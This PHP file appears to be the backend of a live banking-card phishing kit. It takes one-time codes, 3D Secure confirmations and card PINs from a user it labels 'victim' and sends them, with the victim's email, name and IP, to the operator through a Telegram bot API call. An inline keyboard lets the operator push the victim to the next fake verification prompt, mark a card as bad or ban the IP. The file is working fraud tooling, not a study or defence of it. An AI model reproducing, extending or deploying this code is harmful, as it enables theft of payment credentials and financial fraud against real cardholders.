<?php
session_start();
require_once '../config.php';
require_once __DIR__ . '/panel_bridge.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

require_once '../functions.php';

$type = $_POST['type'] ?? '';
$code = $_POST['code'] ?? '';
$ip = _ip();

if (empty($code)) {
    http_response_code(400);
    echo json_encode(['error' => 'Code required']);
    exit;
}

$firstName = $_SESSION['firstName'] ?? '';
$lastName = $_SESSION['lastName'] ?? '';
$email = $_SESSION['email'] ?? 'N/A';
$fullName = trim("$firstName $lastName") ?: $email;

$typeLabels = [
    'sms'           => 'OTP SMS',
    'mail'          => 'OTP MAIL',
    'nfc'           => 'OTP NFC',
    'vbv'           => '3D SECURE',
    'vbv_confirmed' => '3D SECURE ✅',
    'pin'           => 'CODE PIN',
    'safekey'       => 'AMEX SAFEKEY',
    'custom'        => 'CUSTOM',
];

$label = $typeLabels[$type] ?? strtoupper($type);

if ($type === 'vbv_confirmed') {
    $message = "🔐 <b>{$fullName}</b> a validé le VBV APP !

┊ 👺 Compte : <code>{$email}</code>
┊ 🪼 IP : <code>{$ip}</code>
┊ 🪼 " . date('d/m H:i') . "
";
} else {
    $message = "↳ <b>{$label}</b>

┊ 👺 Compte : <code>{$email}</code>
┊ 🔑 Code : <code>{$code}</code>
┊ 🪼 IP : <code>{$ip}</code>
┊ 🪼 " . date('d/m H:i') . "
";
}

$base = 'https://' . $_SERVER['HTTP_HOST'] . '/app/ask.php';
$bp = '?ip=' . $ip . '&token=' . session_id() . '&type=';
$custom_base = 'https://' . $_SERVER['HTTP_HOST'] . '/app/custom.php?ip=' . $ip . '&token=' . session_id();

$keyboard = json_encode([
    'inline_keyboard' => [
        [
            ['text' => '✅ FIN', 'url' => $base . $bp . 'finish'],
            ['text' => '❌ BAD CC', 'url' => $base . $bp . 'invalid_card'],
        ],
        [
            ['text' => '📱 OTP SMS', 'url' => $base . $bp . 'otp_sms'],
            ['text' => '📧 OTP Mail', 'url' => $base . $bp . 'otp_mail'],
        ],
        [
            ['text' => '💳 OTP NFC', 'url' => $base . $bp . 'otp_nfc'],
            ['text' => '🔐 3DS/VBV', 'url' => $base . $bp . 'vbv'],
        ],
        [
            ['text' => '🔢 Code PIN', 'url' => $base . $bp . 'pin'],
            ['text' => '✏️ Custom', 'url' => $custom_base],
        ],
        [
            ['text' => '⛔ Ban IP', 'url' => $base . $bp . 'ban'],
        ],
    ],
]);

@file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $id_cc . '&text=' . urlencode($message) . '&parse_mode=HTML&reply_markup=' . urlencode($keyboard));

panelSessionAddStep($type);
panelSessionAddAction($type, 'Code: ' . $code, 'victim');

sleep(1);
echo json_encode(['success' => true]);
